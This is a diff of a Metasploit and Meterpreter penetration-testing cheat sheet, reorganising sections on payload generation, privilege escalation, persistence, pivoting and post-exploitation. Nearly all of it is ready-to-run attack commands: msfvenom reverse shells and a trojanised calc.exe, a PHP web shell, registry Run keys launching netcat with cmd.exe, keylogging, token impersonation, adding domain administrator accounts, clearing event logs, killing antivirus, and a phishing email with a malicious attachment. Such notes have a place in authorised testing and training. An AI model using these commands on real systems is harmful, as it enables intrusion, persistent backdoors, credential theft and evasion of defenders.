@@ -86,13 +86,6 @@ set LHOST <attacker IP>
 exploit
 ------------------------------------------------------------------------------------------------------
 
-# msfvenom
-
-msfvenom -p <payload parameter=value> -f <file format> --playform <OS platform> -o <output file>
- 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe --platform windows -o payload.exe
-------------------------------------------------------------------------------------------------------
-
 # psexec
 
 use windows/smb/psexec
@@ -129,31 +122,35 @@ OPTIONS:
 
 Many options allow specifying session ranges using commas and dashes.
 
-For example: 
+For example:
    sessions -s checkvm -i 1,3-5
    sessions -k 1-2,5,6
 
-sessions -l                   Show active sessions.
-sessions -i 2                 Interact with session 2.
+sessions -l                                   Show active sessions.
+sessions -i 2                                 Interact with session 2.
 ------------------------------------------------------------------------------------------------------
 
 # Post Exploitation with Meterpreter
 
-migrate                                       Create a new process and migrate to it.
-sysinfo                                       Show system info.
-getuid                                        Show current privileges.
+migrate                                       Migrate the server to another process.
+sysinfo                                       Gets information about the remote system, such as OS.
+getuid                                        Get the user that the server is running as.
 
 # Escalate Privileges
 
-getsystem                                     If this fails, background the session.
-background
+getsystem                                     Attempt to elevate your privilege to that of local system. If this fails containue.
+background                                    Backgrounds the current session.
 
+Option 1:
 use exploit/windows/local/bypassuac_vbs
 set session <#>                               
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
 set LPORT 4444                                This MUST be a different port from what was used in the original exploit.
 exploit
+
+Option 2:
+use post/windows/escalate/getsystem
 
 migrate
 getuid
@@ -178,46 +175,132 @@ wifi_list                                     Show all wireless networks that ha
 use/post/windows/gather/credentials/domain_hashdump
 ------------------------------------------------------------------------------------------------------
 
-# Misc
+# Persistance
+
+run persistence -h
+
+run persistence <starts at computer startup> <tries to connect every 30s> <port 443> <attacker IP>
+
+run persistence -X -i 30 -p 443 -r <target IP>
+
+Notice that it shows where the file is stored on the Windows machine.
+It also gives you the location of the Meterpreter resource file you can run to remove persistence.
+
+Example 2:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 443
+set ExitOnSession false
+set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
+exploit -j -z
+------------------------------------------------
+
+Scheduled persistence
+
+msf > info exploit/windows/local/s4u_persistence
+
+Notice the trigger methods: event, lock, logon, schedule, unlock
+
+msf > use exploit/windows/local/s4u_persistence
+msf > set session 1
+msf > set TRIGGER lock
+msf > exploit
+------------------------------------------------
+
+Volume Shadow Copy persistence
+
+msf > use exploit/windows/local/vss_persistence
+msf > set session 1
+msf > set RHOST 172.16.181.140
+msf > set LPORT 4445  <———use a different port number
+msf > exploit
+------------------------------------------------
+
+Upload netcat.
+meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
+
+Check for anything the runs at startup.
+meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run
+
+Add a registry key.
+meterpreter > reg setval -k HKLM\\software\\windows\\currentversion\\run -v netcat -d ‘c:\windows\system32\nc.exe -ldp 443 -e cmd.exe'
+
+Verify changes to the registry.
+meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v netcat
+
+Reboot the target system.
+meterpreter >  reboot
+
+Connect to target system - option 1
+Open a new Terminal: nc -vn <target IP> 443
+
+Connect to target system - option 2
+use multi/handler
+set PAYLOAD windows/shell_bind_tcp
+set RHOST <target IP>
+exploit
+------------------------------------------------------------------------------------------------------
+
+# Pivoting
 
 ipconfig                                      Look for dual-homed connections.
-     autoroute -s <new CIDR range>            If dual-homed.
-     autoroute -p                             Print routing table.
-netstat
+192.168.0.10
+255.255.255.0
+ 
+10.0.0.5
+255.255.255.0
 
-screenshot                                    Take a photo of the desktop.
+run arp_scanner -r 10.10.10.1/24
+10.0.0.1
+10.0.0.2
+10.0.0.5
+10.0.0.20
 
-idletime
-     if time < 5 min
-     keyscan_start                            Start the keylogger.
-     keyscan_stop                             Stop the keylogger.
-     keyscan_dump                             Dump keystrokes.
+meterpreter > background
+route add 10.0.0.1 255.255.255.0 x            Where x is the meterpreter session ID.
+route print
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.0.0.20
+set PORTS 1-200
+set THREADS 255
+exploit
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 10.0.0.20
+set PAYLOAD windows/meterpreter/bind_tcp
+exploit
+------------------------------------------------------------------------------------------------------
 
-run vnc
-     if the screen is locked exit VNC
-     meterpreter > run screen_unlock
-meterpreter > run get_application_list
-meterpreter > run winenum
+# msfvenom
 
-enum_logged_on_users
+msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>
 
-run getgui -u hacker -p password
+Generate a reverse payload and save as an executable:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe -a x86_64 —platform windows -o /root/payload64.exe
 
-use incognito
-list_tokens -u
-impersonate_token <domain>\\<user>
+Generate a bind payload that avoids a bad character:
+msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
 
-add_user hacker password -h <target IP>
-add_group_user "Domain Admins" hacker -h <target IP>
+Generate a bind payload and encode it 3 times:
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
 
-shell                                         Drop into a Windows shell.
-net user                                      List local users.
-net accounts                                  List local password policy.
-net user hacker password /add /domain         Try to add a new domain account.
-net user hacker password /add                 Add a new local account.
-net localgroup Administrators hacker /add     Add new account to the local Administrators Security Group
-net localgroup Administrators                 Verify account is in the group.
-clearev                                       Clear event logs.
+Inject a bind payload into calc.exe and save it as an executable: 
+msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
+------------------------------------------------
+
+Generate PHP web shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -a php -e php/base64 -f raw -o webshell.php
+
+Upload the file to a web server: /var/www/
+
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.0.0.5
+set LPORT 443
+exploit
+
+Access the shell on the remote web server.
+firefox http://<tartget URL>/webshell.php
 ------------------------------------------------------------------------------------------------------
 
 # Database
@@ -264,115 +347,33 @@ workspace -d <name>           Delete workspace(s).
 workspace -r <old> <new>      Rename workspace.
 ------------------------------------------------------------------------------------------------------
 
-# Generate a Payload/Executable
+# Misc
 
-Generating a reverse payload and save as an executable:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=attackIP LPORT=443 -f exe > evil.exe
+screenshot                                    Grab a screenshot of the interactive desktop
 
-Generate a bind payload that avoids a bad character:
-msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
+idletime                                      Returns the number of seconds the remote user has been idle.
+     if time < 5 min
+     keyscan_start                            Start capturing keystrokes.
+     keyscan_stop                             Stop capturing keystrokes.
+     keyscan_dump                             Dump the keystroke buffer.
 
-Generate a bind payload and encode it 3 times:
-msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+run vnc
+     if the screen is locked exit VNC
+     run screen_unlock
 
-Inject a bind payload into calc.exe and save it as an executable: 
-msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
-------------------------------------------------------------------------------------------------------
+run get_application_list
+run winenum
 
-# Persistance
+run enum_logged_on_users
 
-Example 1
-Upload netcat.
-meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
+run getgui -u hacker -p password
 
-Check for anything the runs at startup.
-meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run
+use incognito
+list_tokens -u
+impersonate_token <domain>\\<user>
 
-Add a registry key.
-meterpreter > reg setval -k HKLM\\software\\windows\\currentversion\\run -v netcat -d ‘c:\windows\system32\nc.exe -ldp 4444 -e cmd.exe'
-
-Verify changes to the registry.
-meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v netcat
-
-Reboot the target system.
-meterpreter >  reboot
-
-Connect to target system - option 1
-nc -vn <target IP> 443
-
-Connect to target system - option 2
-use multi/handler
-set PAYLOAD windows/shell_bind_tcp
-set RHOST <target IP>
-exploit
-
-Example 2
-meterpreter > run metsvc
-Note the port that is used.
-use multi/handler
-set PAYLOAD windows/metsvc_bind_tcp
-set LPORT <port>
-set RHOST <target IP>
-exploit
---------------------------------------------------------------------------------
-
-# Phishing
-
-use multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set EnableStageEncoding true
-set ExitOnSession false
-set LPORT 443
-exploit -j
- 
-sendEmail -t ceo@target.com -f hacker@gmail.com -s <target IP> -u Salaries -a /root/Desktop/salaries.pdf
-------------------------------------------------------------------------------------------------------
-
-# Pivoting
- 
-meterpreter > ipconfig
-192.168.0.10
-255.255.255.0
- 
-10.0.0.5
-255.255.255.0
- 
-meterpreter > run arp_scanner -r 10.10.10.1/24
-10.0.0.1
-10.0.0.2
-10.0.0.5
-10.0.0.20
-
-meterpreter > background
-route add 10.0.0.1 255.255.255.0 x            Where x is the meterpreter session ID.
-route print
-use auxiliary/scanner/portscan/tcp
-set RHOSTS 10.0.0.20
-set PORTS 1-200
-set THREADS 255
-exploit
-use exploit/windows/smb/ms08_067_netapi
-set RHOST 10.0.0.20
-set PAYLOAD windows/meterpreter/bind_tcp
-exploit
-------------------------------------------------------------------------------------------------------
-
-# Web shell php meterpreter
-
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 -f raw > evil.php
-
-Upload file to target web server.
-
-use exploit/multi/handler
-set PAYLOAD php/meterpreter/reverse_tcp
-set LHOST 10.0.0.5
-exploit
-
-Execute evil.php on web server.
-------------------------------------------------------------------------------------------------------
-
-===  Below here are OLD notes that have NOT been organized.  ===
+add_user hacker password -h <target IP>
+add_group_user "Domain Admins" hacker -h <target IP>
 
 upload <local path> <remote path>
 upload /root/putty.exe C:\\Documents\ and\ Settings\\Administrator\Desktop\
@@ -392,17 +393,6 @@ root
 toor
 dir
 
-run scheduleme -m 1 -u -e /root/test.exe
-
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 443
-set ExitOnSession false
-# set AutoRunScript <Path to script you want to autorun after exploit is fired.> 
-set AutoRunScript persistence -r <target IP> -p 21 -A -X -i 30 
-exploit -j -z
-
 # Find and download files
 run search_dwld "%USERPROFILE%\\my documents" passwd
 run search_dwld "%USERPROFILE%\\desktop passwd
@@ -413,31 +403,3 @@ run search_dwld "%USERPROFILE%\\desktop" office
 download -r "%USERPROFILE%\\desktop"  ~/
 download -r "%USERPROFILE%\\my documents"  ~/
 
-# Alternate to shell not SYSTEM
-# execute -f cmd.exe -H -c -i -t
-
-run getgui
-run killav
-run winemun
-run memdump
-run screen_unlock
-
-upload /tmp/system32.exe C:\\windows\\system32\\ 
-reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run 
-reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v system32 -d "C:\\windows\\system32\\system32.exe -Ldp 455 -e cmd.exe" 
-reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v system32 
-reg enumkey -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list 
-reg setval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v sys
-reg queryval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v system32 
-upload /neo/wallpaper1.bmp "C:\\documents and settings\\pentest3\\local settings\\application data\\microsoft\\" 
-
-# Using payload as a backdoor from a shell 
-
-REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\Curre ntVersion\Run /v firewall /t REG_SZ /d "c:\windows\system32\evil.exe" /f
-at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\evil.exe"
-SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\evil.exe"  /ED 11/11/2011
-
-set options "InitialAutoRunScript=migrate -f", "AutoRunScript=post/multi/gather/run_console_rc_file RESOURCE=/opt/scripts/resource/post.rc
-
-auxiliary(mssql_sql) > set sql EXEC sp_addlogin hacker, password;EXEC master.dbo.sp_addsrvrolemember hacker, sysadmin;  —priv
-run
